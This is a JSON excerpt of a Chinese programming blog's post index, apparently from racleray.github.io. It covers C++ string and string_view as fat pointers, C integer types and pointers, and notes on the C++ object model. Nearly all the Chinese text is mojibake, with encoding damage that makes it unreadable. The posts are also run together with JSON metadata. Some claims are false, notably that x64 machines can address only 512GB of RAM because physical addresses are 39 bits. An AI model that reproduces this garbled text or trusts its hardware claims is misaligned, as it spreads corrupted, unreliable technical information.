ç‚«è€€å·²ä¹…çš„æ•°ç»„èƒ–æŒ‡é’ˆã€‚C++20 ä¸­çš„ span ä¹Ÿæ˜¯è¿™ä¸ªæ€æƒ³ã€‚æå€¡æŠŠ ptr å’Œ len è¿™ä¸¤ä¸ªé€»è¾‘ä¸Šç›¸å…³çš„å‚æ•°ç»‘åœ¨ä¸€èµ·ï¼Œé¿å…ç¨‹åºå‘˜çŠ¯é”™ã€‚ C++ ä¸­çš„ vector å’Œ string å…¶å®éƒ½æ˜¯èƒ–æŒ‡é’ˆã€‚string å’Œ vector å†…éƒ¨éƒ½æœ‰ä¸‰ä¸ªæˆå‘˜å˜é‡ï¼šptr, len, capacityã€‚ å‰ä¸¤ä¸ª [ptr, len] å…¶å®å°±æ˜¯è¡¨ç¤ºå®é™…æœ‰æ•ˆèŒƒå›´ï¼ˆå­˜å‚¨äº†å­—ç¬¦çš„ï¼‰çš„èƒ–æŒ‡é’ˆã€‚ è€Œ [ptr, capacity] å°±æ˜¯è¡¨ç¤ºå®é™…å·²åˆ†é…å†…å­˜ï¼ˆæ“ä½œç³»ç»Ÿè®¤ä¸ºçš„ï¼‰çš„èƒ–æŒ‡é’ˆã€‚ åœ¨ GCC çš„å®ç°ä¸­ï¼Œè¢«æ¢æˆäº†ä¸‰ä¸ªæŒ‡é’ˆ [ptr, ptr + len, ptr + capacity] æ¥è¡¨ç¤ºã€‚ å¼ºå¼•ç”¨ã€å¼±å¼•ç”¨ string string å®¹å™¨ï¼Œæ˜¯æŒæ¡ç€å­—ç¬¦ä¸²ç”Ÿå‘½å‘¨æœŸï¼ˆlifespanï¼‰çš„èƒ–æŒ‡é’ˆã€‚è¿™ç§æŒç®¡äº†æ‰€æŒ‡å‘å¯¹è±¡ç”Ÿå‘½å‘¨æœŸçš„æŒ‡é’ˆç§°ä¸ºå¼ºå¼•ç”¨ï¼ˆstrong referenceï¼‰ã€‚ å½“ string å®¹å™¨è¢«æ‹·è´æ—¶ï¼Œå…¶æŒ‡å‘çš„å­—ç¬¦ä¸²ä¹Ÿä¼šè¢«æ‹·è´ï¼ˆæ·±æ‹·è´ï¼‰ã€‚ å½“ string å®¹å™¨è¢«é”€æ¯æ—¶ï¼Œå…¶æŒ‡å‘çš„å­—ç¬¦ä¸²ä¹Ÿä¼šè¢«é”€æ¯ï¼ˆå†…å­˜é‡Šæ”¾ï¼‰ã€‚ ä¸€ä¸ªå¼ºå¼•ç”¨çš„ string åˆ°å¤„æ‹·è´æ¥æ‹·è´å»ï¼Œåˆ™å…¶æŒ‡å‘çš„å­—ç¬¦ä¸²ä¹Ÿä¼šè¢«å¤šæ¬¡æ‹·è´ï¼Œæ¯”è¾ƒä½æ•ˆã€‚äººä»¬å¸¸ç”¨ string const &amp; æ¥é¿å…ä¸å¿…è¦æ‹·è´ï¼Œä½†ä»æ¯”è¾ƒéº»çƒ¦ã€‚ C++17 å¼•å…¥äº†å¼±å¼•ç”¨èƒ–æŒ‡é’ˆ string_viewï¼Œè¿™ç§å¼±å¼•ç”¨ï¼ˆweak referenceï¼‰ä¸å½±å“åŸå¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸï¼ŒåŸå¯¹è±¡çš„é”€æ¯ä»ç„¶ç”±å¼ºå¼•ç”¨æ§åˆ¶ã€‚ å½“ string_view è¢«æ‹·è´æ—¶ï¼Œå…¶æŒ‡å‘çš„å­—ç¬¦ä¸²ä»ç„¶æ˜¯åŒä¸€ä¸ªï¼ˆæµ…æ‹·è´ï¼‰ã€‚ å½“ string_view è¢«é”€æ¯æ—¶ï¼Œå…¶æŒ‡å‘çš„å­—ç¬¦ä¸²ä»å­˜åœ¨ï¼ˆå¼±å¼•ç”¨ä¸å½±å“ç”Ÿå‘½å‘¨æœŸï¼‰ã€‚ ä½¿ç”¨åŸåˆ™ï¼š å¼ºå¼•ç”¨å’Œå¼±å¼•ç”¨éƒ½å¯ä»¥ç”¨æ¥è®¿é—®å¯¹è±¡ã€‚ æ¯ä¸ªå­˜æ´»çš„å¯¹è±¡ï¼Œå¼ºå¼•ç”¨æœ‰ä¸”åªæœ‰ä¸€ä¸ªã€‚ å¼±å¼•ç”¨å¯ä»¥åŒæ—¶å­˜åœ¨å¤šä¸ªï¼Œä¹Ÿå¯ä»¥æ²¡æœ‰ã€‚ å¼ºå¼•ç”¨é”€æ¯æ—¶ï¼Œæ‰€æœ‰å¼±å¼•ç”¨éƒ½ä¼šå¤±æ•ˆã€‚å¦‚æœå¼ºå¼•ç”¨é”€æ¯ä»¥åï¼Œä»å­˜åœ¨å…¶ä»–æŒ‡å‘è¯¥å¯¹è±¡çš„å¼±å¼•ç”¨ï¼Œè®¿é—®ä»–ä¼šå¯¼è‡´ç¨‹åºå¥”æºƒï¼ˆé‡æŒ‡é’ˆï¼‰ã€‚ å»ºè®®åˆ›å»º string_view ä»¥åï¼Œä¸è¦æ”¹å†™åŸå­—ç¬¦ä¸²ã€‚ å¸¸è§å¼ºå¼±å¼•ç”¨ï¼š å¼ºå¼•ç”¨ å¼±å¼•ç”¨ string string_view wstring wstring_view vector span unique_ptr T * shared_ptr weak_ptr å°å­—ç¬¦ä¸²ä¼˜åŒ– æ³¨æ„å½“ string é•¿åº¦åœ¨15 ä»¥å†…ï¼Œä¼šä¿å­˜åœ¨ä¸€ä¸ªå…±äº«æ ˆç©ºé—´åœ°å€(_M_local_buf )ï¼Œæ­¤æ—¶ä¿®æ”¹åŸå­—ç¬¦ä¸²ä¼šåœ¨æ­¤åœ°å€ä¸Šè¦†ç›–ï¼Œè¿˜å¯ä»¥é€šè¿‡å¼±å¼•ç”¨æŸ¥çœ‹å†…å®¹ã€‚ ä½†æ˜¯å½“é•¿åº¦å¤§äº 15 ï¼Œstring å­—ç¬¦ä¸²ä¿å­˜åœ¨å †ç©ºé—´ï¼Œä¸€æ—¦ä¿®æ”¹åŸå­—ç¬¦ä¸²ï¼Œä½¿ç”¨å¼±å¼•ç”¨ä¼šå¯¼è‡´è®¿å­˜å¤±æ•ˆã€‚ å­—ç¬¦ä¸²åˆ‡ç‰‡ string(â€œhelloâ€).substr(1, 3) ä¼šå¾—åˆ° â€œellâ€ã€‚ è¿™æ ·å…¶å®ä¸æ˜¯æœ€é«˜æ•ˆçš„ï¼Œå› ä¸º string.substr å¹¶ä¸æ˜¯å°±åœ°ä¿®æ”¹å­—ç¬¦ä¸²ï¼Œä»–æ˜¯è¿”å›ä¸€ä¸ªå…¨æ–°çš„ string å¯¹è±¡ï¼Œç„¶åæŠŠåŸå­—ç¬¦ä¸²é‡Œçš„ 1 åˆ° 3 è¿™éƒ¨åˆ†å­å­—ç¬¦ä¸²æ‹·è´åˆ°è¿™ä¸ªæ–°çš„ string å¯¹è±¡é‡Œå»ã€‚ C++17 åªéœ€è¦ä¿è¯åŸæ¥çš„å­—ç¬¦ä¸²å­˜åœ¨äºå†…å­˜ä¸­ï¼Œè®© substr åªæ˜¯è¿”å›åˆ‡ç‰‡åçš„èƒ–æŒ‡é’ˆ [ptr, len]ï¼Œä¸å°±è®©æ–°å­—ç¬¦ä¸²å’ŒåŸå­—ç¬¦ä¸²å…±äº«ä¸€ç‰‡å†…å­˜ï¼Œå®ç°äº†é›¶æ‹·è´é›¶åˆ†é…ã€‚äºæ˜¯å°±æœ‰äº†æ¥å£å’Œ string å¾ˆç›¸ä¼¼ï¼Œä½†æ˜¯åªä¿ç•™èƒ–æŒ‡é’ˆï¼Œè€Œä¸æŒç®¡ä»–æ‰€æŒ‡å‘å†…å­˜ç”Ÿå‘½å‘¨æœŸçš„ string_view ç±»ã€‚ ä¸è®ºå­å­—ç¬¦ä¸²å¤šå¤§ï¼ŒçœŸæ­£æ”¹å˜çš„åªæœ‰ä¸¤ä¸ªå˜é‡ã€‚ remove_prefixã€remove_suffix sv.remove_prefix(n) ç­‰ä»·äº sv = sv.substr(n) sv.remove_suffix(n) ç­‰ä»·äº sv = sv.substr(0, n) ä»–ä»¬éƒ½æ˜¯å°±åœ°ä¿®æ”¹çš„ï¼Œè¿™ä¸ªå°±åœ°ä¿®æ”¹çš„æ˜¯ string_view å¯¹è±¡æœ¬èº«ï¼Œè€Œä¸æ˜¯ä¿®æ”¹ä»–æŒ‡å‘çš„å­—ç¬¦ä¸²ï¼ŒåŸ string è¿˜æ˜¯ä¸ä¼šå˜çš„ã€‚ ä¸åŒä¹‹å¤„åœ¨äºï¼Œsubstr(pos, len) é‡åˆ° pos &gt; sv.size() çš„æƒ…å†µä¼šæŠ›å‡º out_of_range å¼‚å¸¸ã€‚è€Œ remove_prefix/suffix å°±ä¸ä¼šï¼Œå¦‚æœä»–çš„ n &gt; sv.size()ï¼Œåˆ™å±äºæœªå®šä¹‰è¡Œä¸ºï¼Œå¯èƒ½å´©æºƒã€‚ remove_prefix/suffix æ›´é«˜æ•ˆï¼Œsubstr æ›´å®‰å…¨ã€‚ ç±»å‹è½¬æ¢è§„åˆ™ 1234567891011// éšå¼ï¼šstring s = â€œhelloâ€;// æ˜¾å¼ï¼šstring s(â€œhelloâ€); æˆ– auto s = string(â€œhelloâ€);// c_strï¼šconst char *cs = s.c_str();const char * ===éšå¼==O(n)==&gt; string_viewconst char * ===éšå¼==O(n)==&gt; stringstring ===éšå¼==O(1)==&gt; string_viewstring_view ===æ˜¾å¼==O(n)==&gt; stringstring ===c_str==O(1)==&gt; const char *","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C++","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"String","slug":"String","permalink":"https://racleray.github.io/tags/String/"}],"author":"HeRui"},{"title":"æ·±å…¥CæŒ‡é’ˆ","slug":"æ·±å…¥CæŒ‡é’ˆ","date":"2022-11-09T11:02:33.000Z","updated":"2024-01-09T10:20:20.905Z","comments":true,"path":"posts/379e512c.html","link":"","permalink":"https://racleray.github.io/posts/379e512c.html","excerpt":"C æŒ‡é’ˆå›é¡¾","text":"è®¡ç®—æœºä½¿ç”¨ä¸€ä¸ªå­—ï¼ˆwordï¼‰ï¼Œè¡¨ç¤ºå†…å­˜åœ°å€ã€‚åœ¨ 32 ä½è®¡ç®—æœºä¸Šä¼šæŠŠ 4 ä¸ªå­—èŠ‚ï¼ˆbyteï¼‰æ‹¼æˆä¸€ä¸ªå­—ï¼Œå­—ç”± 32 ä¸ªä½ï¼ˆbitï¼‰ç»„æˆã€‚åœ¨ 64 ä½è®¡ç®—æœºä¸Šä¼šæŠŠ 8 ä¸ªå­—èŠ‚æ‹¼æˆä¸€ä¸ªå­—ï¼Œå­—ç”± 64 ä¸ªä½ç»„æˆã€‚å†…å­˜åœ°å€åœ¨å†…å­˜ä¸­ï¼Œå°±æ˜¯ä¸€ä¸²å›ºå®šé•¿åº¦çš„æ•´æ•°ã€‚ å¯è¡¨ç¤ºçš„å†…å­˜åœ°å€èŒƒå›´ è™½ç„¶ 64 ä½è®¡ç®—æœºçš„å¯„å­˜å™¨èƒ½å¤„ç† 64 ä½çš„æ•´æ•°ï¼Œå®é™…ä¸Šçš„å†…å­˜åœ°å€å¹¶æ²¡æœ‰ 64 ä½ã€‚å®é™…ä¸Šåœ°å€çš„é«˜ 16 ä½å§‹ç»ˆå’Œç¬¬ 48 ä½ä¸€è‡´ï¼ˆç¬¦å·æ‰©å±•ï¼‰ï¼Œä¹Ÿå°±æ˜¯è™šæ‹Ÿåœ°å€ç©ºé—´åªæœ‰ 48 ä½ã€‚ è€Œç»è¿‡ MMU æ˜ å°„åå®é™…ç»™å†…å­˜çš„åœ°å€åªæœ‰ 39 ä½ï¼Œå› æ­¤å¦‚ä»Šçš„ x64 æ¶æ„å®é™…ä¸Šåªèƒ½è®¿é—® 512GB å†…å­˜ï¼Œå¦‚æœæ’äº†è¶…è¿‡è¿™ä¸ªå¤§å°çš„å†…å­˜æ¡ä»–ä¹Ÿä¸ä¼šè®¤å‡ºæ¥ã€‚ æ­¤å¤–ï¼Œ16 ä½è®¡ç®—æœºå®é™…ä¸Šèƒ½é€šè¿‡é¢å¤–çš„æ®µå¯„å­˜å™¨è®¿é—®åˆ° 20 ä½çš„å†…å­˜åœ°å€ï¼ˆ1MBï¼‰ã€‚ 32 ä½è®¡ç®—æœºè¿˜èƒ½é€šè¿‡ PAE æŠ€æœ¯ï¼ˆç‰©ç†åœ°å€æ‰©å±•ï¼‰è®¿é—®åˆ° 36 ä½çš„å†…å­˜åœ°å€ï¼ˆ64GBï¼‰ã€‚ 64 ä½è®¡ç®—æœºåè€Œæ˜¯å› ä¸º 16777216 TB å¤ªå¤§ï¼Œå†…å­˜åœ°å€è¢«é˜‰å‰²åˆ°äº† 39 ä½ï¼ˆ512GBï¼‰ã€‚ æ‰©å±•ï¼šæ•°çš„è¡¨ç¤º C è¯­è¨€ä¸­çš„æ•´æ•°ç±»å‹ ç±»å‹ Unix 32ä½ Unix 64ä½ Windows 32ä½ Windows 64ä½ char 8 ä½ 8 ä½ 8 ä½ 8 ä½ short 16 ä½ 16 ä½ 16 ä½ 16 ä½ int 32 ä½ 32 ä½ 32 ä½ 32 ä½ long 32 ä½ 64 ä½ 32 ä½ 32 ä½ long long 64 ä½ 64 ä½ 64 ä½ 64 ä½ long æ¯”è¾ƒç‰¹æ®Šï¼Œåœ¨ Unix ä¸Šéšç³»ç»Ÿä½æ•°å˜åŒ–ï¼ŒWindows ä¸Šå§‹ç»ˆæ˜¯ 32 ä½ã€‚æ‰€ä»¥åœ¨ç¼–å†™ C è¯­è¨€ç¨‹åºæ—¶ï¼Œåº”è¯¥é¿å…ä½¿ç”¨ long ç±»å‹ï¼Œä»–ä¼šå¯¼è‡´ä½ çš„ç¨‹åºéš¾ä»¥è·¨å¹³å°ã€‚ åœ¨æ•°å­—åé¢è¿½åŠ  U å’Œ L å¯ä»¥è¡¨ç¤ºä¸åŒç±»å‹çš„å­—é¢å¸¸é‡ï¼Œä¸åŒºåˆ†å¤§å°å†™ï¼Œä¾‹å¦‚ï¼š 32 æ˜¯ int ç±»å‹ 32L æ˜¯ long ç±»å‹ 32LL æ˜¯ long long ç±»å‹ 32U æ˜¯ unsigned int ç±»å‹ 32UL æ˜¯ unsigned long ç±»å‹ 32ULL æ˜¯ unsigned long long ç±»å‹ å°½ç®¡ä¸»æµæ“ä½œç³»ç»Ÿä¸Š int éƒ½æ˜¯32ä½çš„ï¼ŒCè¯­è¨€æ ‡å‡†å¹¶æ²¡æœ‰è§„å®š int å°±æ˜¯32ä½çš„ã€‚int ç”šè‡³å¯ä»¥æ˜¯16ä½çš„ã€‚ ä¸ºäº†è§£å†³ä¸åŒæ“ä½œç³»ç»Ÿä¸Šå¯¹ç±»å‹å®šä¹‰æ··ä¹±çš„é—®é¢˜ï¼ŒCè¯­è¨€æ ‡å‡†å¼•å…¥äº† stdint.h è¿™ä¸ªå¤´æ–‡ä»¶ã€‚ä»–é‡Œé¢åŒ…å«ä¸€ç³»åˆ—ç±»å‹åˆ«å(typedef)ï¼Œè¿™äº›åˆ«åä¿è¯ä¸è®ºæ˜¯ä»€ä¹ˆæ“ä½œç³»ç»Ÿä»€ä¹ˆæ¶æ„ï¼Œéƒ½æ˜¯å›ºå®šçš„å¤§å°ï¼š 123456789typedef char int8_t;typedef short int16_t;typedef int int32_t;typedef long long int64_t;typedef unsigned char uint8_t;typedef unsigned short uint16_t;typedef unsigned int uint32_t;typedef unsigned long long uint64_t; è¡¨ç¤ºå†…å­˜åœ°å€çš„ç±»å‹ æŒ‡é’ˆçš„æœ¬è´¨å°±æ˜¯å†…å­˜åœ°å€ï¼Œæ‰€ä»¥æŒ‡é’ˆçš„å¤§å°åœ¨ 32 ä½ç³»ç»Ÿä¸Šå°± 32 ä½ï¼Œ64 ä½ç³»ç»Ÿä¸Šå°± 64 ä½ã€‚intptr_t å’Œ uintptr_t è‡ªåŠ¨éšç³»ç»Ÿä½æ•°å˜åŒ–ã€‚ intptr_t åœ¨ 32 ä½å¹³å°ä¸Šç­‰ä»·äº int32_tï¼›åœ¨ 64 ä½å¹³å°ä¸Šç­‰ä»·äº int64_tã€‚ uintptr_t åœ¨ 32 ä½å¹³å°ä¸Šç­‰ä»·äº uint32_tï¼›åœ¨ 64 ä½å¹³å°ä¸Šç­‰ä»·äº uint64_tã€‚ å¦å¤–ï¼Œåœ¨ä¸»æµæ“ä½œç³»ç»Ÿä¸Šï¼Œsize_t å’Œ uintptr_t å®Œå…¨ç­‰ä»·ã€‚size_t æ˜¯æ ‡å‡†åº“å¤§é‡ä½¿ç”¨çš„ç”¨äºè¡¨ç¤ºå¤§å°çš„ç±»å‹ï¼Œä¾‹å¦‚ vector::size() è¿”å›ç±»å‹å°±æ˜¯ size_tã€‚ æœ‰ç¬¦å·æ•´æ•°vsæ— ç¬¦å·æ•´æ•° è¡¥ç è¡¨ç¤ºæ³•ï¼Œä½¿å¾—è´Ÿæ•°çš„è®¡ç®—å¯ä»¥ç›´æ¥ä½¿ç”¨æ­£æ•°çš„è®¡ç®—ç”µè·¯ï¼Œè€Œä¸ç”¨é‡æ–°è®¾è®¡æœ‰ç¬¦å·ä½å¤„ç†çš„æ–°ç”µè·¯ã€‚ è¡¥ç è¡¨ç¤ºæ³•çš„ç›®çš„æ˜¯ï¼Œåˆ©ç”¨åŠ æ³•å™¨çš„â€œæº¢å‡ºâ€æœºåˆ¶ï¼Œä¾‹å¦‚ -1 + 2 = 1ï¼Œåœ¨è®¡ç®—æœºçœ‹æ¥å°±æ˜¯ï¼š11111111 + 00000010 = 100000001ã€‚æº¢å‡ºçš„1ï¼Œå°±è¢«ä¸¢å¼ƒï¼Œè€Œå…¶ç»“æœæ­£å¥½æ˜¯1ã€‚ è´Ÿæ•°çš„èŒƒå›´åè€Œæ¯”æ­£æ•°å¤§æ˜¯å› ä¸ºè¦å›é¿ -0ã€‚ ç±»å‹è½¬æ¢ å°ç±»å‹å’Œå¤§ç±»å‹åšæ•°å­¦è¿ç®—ï¼ˆ+-*/%ï¼‰ä¼šå¾—åˆ°ä¸¤ä¸ªç±»å‹ä¸­çš„å¤§ç±»å‹ã€‚ å¦‚æœä¸¤è¾¹æœ‰ä¸€è¾¹æ˜¯ unsigned çš„ä½†æ˜¯åŸºæœ¬ç±»å‹æ˜¯ç›¸åŒçš„ï¼Œåˆ™ç»“æœæ˜¯ unsigned çš„ï¼šunsigned int + int = unsigned int å¦‚æœä¸¤è¾¹æœ‰ä¸€è¾¹æ˜¯ unsigned çš„ä½†æ˜¯åŸºæœ¬ç±»å‹æ˜¯ä¸åŒçš„ï¼Œåˆ™ç»“æœæ˜¯ å¤§ç±»å‹ï¼šunsigned short + int = int æµ®ç‚¹æ•°è¡¨ç¤º ä»ä¸‹å‘ä¸Šï¼Œå¯ä»¥çœ‹åˆ°æµ®ç‚¹æ•°è¢«è½¬æ¢ä¸ºè®¡ç®—æœºä¸­äºŒè¿›åˆ¶è¡¨ç¤ºçš„è¿‡ç¨‹ã€‚ï¼ˆå›¾ä¸­127+3=130ï¼‰ float ç”± 4 ä¸ªå­—èŠ‚ç»„æˆï¼Œä¹Ÿå°±æ˜¯ 32 ä¸ªä½ã€‚æœ€é«˜ä½æ˜¯ç¬¦å·ä½ï¼Œæ¥ç€çš„ 8 ä½æ˜¯æŒ‡æ•°ä½(e)ã€‚ å‰©ä¸‹çš„ 23 ä½æ˜¯åº•æ•°ä½(m)ã€‚ æ³¨æ„æŒ‡æ•°ä½(e)æ˜¯ç”¨åç è¡¨ç¤ºçš„ã€‚ åº•æ•°ä½é™åˆ¶äº†æµ®ç‚¹æ•°å¯è¡¨ç¤ºçš„æœ‰æ•ˆä½æ•°ã€‚ æ•°çš„è®¡ç®— å¸¸ç”¨å‡½æ•°åç§°ï¼š int long long long float double C++ é‡è½½ç‰ˆ abs labs llabs fabsf fabs std::abs - - - fmaxf fmax std::max - - - fminf fmin std::min % % % fmodf fmod std::fmod - - - powf pow std::pow - - - sqrtf sqrt std::sqrt - - - sinf sin std::sin æ³¨æ„å‡½æ•°è°ƒç”¨ä¸­éšå¼çš„ç±»å‹è½¬æ¢ã€‚C++ä¸­ï¼Œå¯ä»¥ä½¿ç”¨æ›´æ–¹ä¾¿çš„é‡è½½å‡½æ•°ã€‚ æŒ‡é’ˆ å¸¸è§è®¡ç®—æœºæ¶æ„ä¸­ï¼Œè¡¨ç¤ºæŒ‡é’ˆçš„æ•´æ•°ï¼Œåœ¨å†…å­˜ä¸­ä»¥å°ç«¯å­—èŠ‚åºä¿å­˜åœ¨å›ºå®šé•¿åº¦çš„å†…å­˜ä¸­ã€‚ æŒ‡é’ˆæ— éæ˜¯ä¸€ä¸ª 64 ä½æ•´æ•°ï¼Œåœ¨ 32 ä½è®¡ç®—æœºä¸Šåˆ™æ˜¯ä¸ª 32 ä½æ•´æ•°ã€‚è¡¨ç¤ºçš„æ˜¯æŒ‡é’ˆæ‰€æŒ‡å‘å˜é‡åœ¨å†…å­˜ä¸­çš„èµ·å§‹åœ°å€ï¼ˆç¬¬ä¸€ä¸ªå­—èŠ‚æ‰€åœ¨çš„ä½ç½®ï¼‰ã€‚ç”šè‡³å¯ä»¥æŠŠ int* å¼ºåˆ¶è½¬æ¢æˆ unsigned long ç±»å‹ï¼Œæ¥æ‰“å°å‡ºè¿™ä¸ªåœ°å€çš„æ•´æ•°å€¼ã€‚ C++ çš„å¼•ç”¨ C++ çš„å¼•ç”¨ç±»å‹ int&amp; æœ¬è´¨æ— éæ˜¯ int* æŒ‡é’ˆã€‚åŒºåˆ«åœ¨äºï¼šå¼•ç”¨ä¸éœ€è¦æ‰‹åŠ¨ &amp; æ¥åˆ›å»ºï¼›ä¸éœ€è¦æ‰‹åŠ¨ * æ¥åˆ›å»ºï¼›æ— æ³•é‡æ–°èµ‹å€¼ï¼ŒæŒ‡å‘æ–°çš„å˜é‡ï¼›æ— æ³•ä¸ºç©ºæŒ‡é’ˆã€‚ nullptr åœ¨C++ä¸­æ ¹æ®ç±»å‹è°ƒç”¨ä¸åŒçš„é‡è½½ç‰ˆæœ¬ã€‚å› ä¸ºCä¸­NULLå¯ä»¥æ˜¯ 0ï¼Œé‚£ä¹ˆ func(int) å’Œ func(int*) å°±åŒºåˆ†ä¸äº†ã€‚ æ•°ç»„æŒ‡é’ˆ æ•°ç»„å˜é‡å°±æ˜¯æŒ‡å‘æ•°ç»„å…¶ä¸­ä¸€ä¸ªå…ƒç´ çš„æŒ‡é’ˆã€‚æ•°ç»„ä½œä¸ºå‚æ•°ä¼ é€’ï¼Œä¼šé€€åŒ–ä¸ºæŒ‡é’ˆã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C","slug":"C","permalink":"https://racleray.github.io/tags/C/"}],"author":"HeRui"},{"title":"æ·±å…¥C++å¯¹è±¡æ¨¡å‹ç¬”è®°","slug":"æ·±å…¥C++å¯¹è±¡æ¨¡å‹ç¬”è®°","date":"2022-06-30T12:42:31.000Z","updated":"2023-08-07T12:02:23.621Z","comments":true,"path":"posts/ae73e7a0.html","link":"","permalink":"https://racleray.github.io/posts/ae73e7a0.html","excerpt":"ã€Šæ·±å…¥æ¢ç´¢C++å¯¹è±¡æ¨¡å‹ã€‹ä¹‹å‰çš„ç¬”è®°ï¼Œæœ‰äº›è¿‡æ—¶çš„æ¡æ¬¾åšäº†ç‚¹æ”¹åŠ¨ã€‚","text":"ä¸€ã€å…³äºå¯¹è±¡ 1.0 åŠ ä¸Šå°è£…åçš„å¸ƒå±€æˆæœ¬ï¼ˆLayout Costs for Adding Encapsulationï¼‰ C++åœ¨å¸ƒå±€ä»¥åŠå­˜å–æ—¶é—´ä¸Šä¸»è¦çš„é¢å¤–è´Ÿæ‹…æ˜¯ç”±virtualå¼•èµ·çš„: virtual function æœºåˆ¶ç”¨ä»¥æ”¯æŒä¸€ä¸ªæœ‰æ•ˆç‡çš„â€œæ‰§è¡ŒæœŸç»‘å®šâ€ï¼ˆruntime bindingï¼‰ã€‚ virtual base class ç”¨ä»¥å®ç°â€œå¤šæ¬¡å‡ºç°åœ¨ç»§æ‰¿ä½“ç³»ä¸­çš„base classï¼Œæœ‰ä¸€ä¸ªå•ä¸€è€Œè¢«å…±äº«çš„å®ä¾‹ï¼ˆiosï¼‰ã€‚ 1.1 C++å¯¹è±¡æ¨¡å‹ åœ¨C++ä¸­ï¼Œæœ‰ä¸¤ç§class data membersï¼šstaticå’Œnonstaticï¼Œä»¥åŠä¸‰ç§class member functionsï¼šstaticã€nonstaticå’Œvirtualã€‚ åœ¨C++å¯¹è±¡æ¨¡å‹ä¸­ï¼ŒNonstatic data membersåœ¨æ¯ä¸€ä¸ªclass objectä¹‹å†…ï¼Œstatic data membersåˆ™è¢«å­˜æ”¾åœ¨class objectä¹‹å¤–ã€‚ Staticå’Œnonstatic function membersè¢«æ”¾åœ¨class objectä¹‹å¤–ã€‚ Virtual functionsï¼š æ¯ä¸€ä¸ª class äº§ç”Ÿå‡ºä¸€å †æŒ‡å‘virtual functionsçš„æŒ‡é’ˆï¼Œæ”¾åœ¨è¡¨æ ¼ä¹‹ä¸­ã€‚è¿™ä¸ªè¡¨æ ¼è¢«ç§°ä¸º virtual tableï¼ˆvtblï¼‰ã€‚ æ¯ä¸€ä¸ªclass object è¢«å®‰æ’ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘ç›¸å…³çš„virtual tableã€‚é€šå¸¸è¿™ä¸ªæŒ‡é’ˆè¢«ç§°ä¸º vptrã€‚vptrçš„è®¾å®šï¼ˆsettingï¼‰å’Œé‡ç½®ï¼ˆresettingï¼‰éƒ½ç”±æ¯ä¸€ä¸ªclassçš„constructorã€destructorå’Œcopy assignmentè¿ç®—ç¬¦è‡ªåŠ¨å®Œæˆã€‚æ¯ä¸€ä¸ª classæ‰€å…³è”çš„ type_info objectï¼ˆç”¨ä»¥æ”¯æŒruntime type identificationï¼ŒRTTIï¼‰ä¹Ÿç»ç”±virtual tableè¢«æŒ‡å‡ºæ¥ï¼Œé€šå¸¸æ”¾åœ¨è¡¨æ ¼çš„ç¬¬ä¸€ä¸ªslotï¼ˆåœ°å€ç©ºé—´ï¼‰ã€‚ 1.2 å…³é”®è¯æ‰€å¸¦æ¥çš„å·®å¼‚ C structåœ¨C++ä¸­çš„ä¸€ä¸ªåˆç†ç”¨é€”ï¼Œæ˜¯å½“ä½ è¦ä¼ é€’â€œä¸€ä¸ªå¤æ‚çš„class objectçš„å…¨éƒ¨æˆ–éƒ¨åˆ†â€åˆ°æŸä¸ªCå‡½æ•°å»æ—¶ï¼Œstructå£°æ˜å¯ä»¥å°†æ•°æ®å°è£…èµ·æ¥ï¼Œå¹¶ä¿è¯æ‹¥æœ‰ä¸Cå…¼å®¹çš„ç©ºé—´å¸ƒå±€ã€‚ ç„¶è€Œè¿™é¡¹ä¿è¯åªåœ¨ç»„åˆï¼ˆcompositionï¼‰çš„æƒ…å†µä¸‹æ‰å­˜åœ¨ã€‚å¦‚æœæ˜¯â€œç»§æ‰¿â€è€Œä¸æ˜¯â€œç»„åˆâ€ï¼Œç¼–è¯‘å™¨ä¼šå†³å®šæ˜¯å¦åº”è¯¥æœ‰é¢å¤–çš„data membersè¢«å®‰æ’åˆ°base struct subobjectä¹‹ä¸­ã€‚ 1.3 å¯¹è±¡çš„å·®å¼‚ C++ç¨‹åºè®¾è®¡æ¨¡å‹ç›´æ¥æ”¯æŒä¸‰ç§programming paradigmsï¼ˆç¨‹åºè®¾è®¡èŒƒå¼ï¼‰ï¼š ç¨‹åºæ¨¡å‹ï¼ˆprocedural modelï¼‰ã€‚å°±åƒ Cä¸€æ ·ï¼ŒC++å½“ç„¶ä¹Ÿæ”¯æŒå®ƒã€‚ æŠ½è±¡æ•°æ®ç±»å‹æ¨¡å‹ï¼ˆabstract data type modelï¼ŒADTï¼‰ã€‚æ­¤æ¨¡å‹æ‰€è°“çš„â€œæŠ½è±¡â€æ˜¯å’Œä¸€ç»„è¡¨è¾¾å¼ï¼ˆpublicæ¥å£ï¼‰ä¸€èµ·æä¾›çš„ï¼Œå®é™…ä»ç„¶æœªå®šä¹‰ã€‚ é¢å‘å¯¹è±¡æ¨¡å‹ï¼ˆobject-oriented modelï¼‰ã€‚åœ¨æ­¤æ¨¡å‹ä¸­æœ‰ä¸€äº›å½¼æ­¤ç›¸å…³çš„ç±»å‹ï¼Œé€šè¿‡ä¸€ä¸ªæŠ½è±¡çš„ base classï¼ˆç”¨ä»¥æä¾›å…±åŒæ¥å£ï¼‰è¢«å°è£…èµ·æ¥ã€‚ åªæœ‰é€šè¿‡pointeræˆ–referenceé—´æ¥å¤„ç†å¯¹è±¡ï¼Œæ‰èƒ½æ”¯æŒå¤šæ€æ€§è´¨ã€‚ C++ä»¥ä¸‹åˆ—æ–¹æ³•æ”¯æŒå¤šæ€ï¼š ç»ç”±ä¸€ç»„éšå¼çš„è½¬åŒ–æ“ä½œã€‚ä¾‹å¦‚æŠŠä¸€ä¸ª derived class æŒ‡é’ˆè½¬åŒ–ä¸ºä¸€ä¸ªæŒ‡å‘å…¶ public base typeçš„æŒ‡é’ˆã€‚ ç»ç”± virtual function æœºåˆ¶ã€‚ ç»ç”± dynamic_cast å’Œ typeid è¿ç®—ç¬¦ã€‚ 